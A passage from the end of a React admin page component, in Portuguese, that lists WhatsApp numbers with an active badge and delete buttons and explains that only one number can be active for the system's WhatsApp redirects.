                        <div className="flex items-center gap-2">
                          {numero.ativo && (
                            <Badge className="bg-success text-success-foreground">Ativo</Badge>
                          )}
                          <Button
                            variant="ghost"
                            size="icon"
                            onClick={(e) => {
                              e.stopPropagation();
                              excluirNumeroWhatsApp(numero.id);
                            }}
                            className="text-destructive hover:text-destructive hover:bg-destructive/10"
                          >
                            <Trash2 className="w-4 h-4" />
                          </Button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}

                <div className="p-4 bg-admin-box text-admin-box-foreground rounded-lg">
                  <p className="text-sm">
                    <strong>Como funciona:</strong> Clique no número para ativá-lo. Apenas um número pode estar ativo por vez. O número ativo será usado em todos os redirecionamentos de WhatsApp do sistema.
                  </p>
                </div>
              </CardContent>
            </Card>
          </div>
        )}
      </div>
    </div>
  );
};

export default Admin;
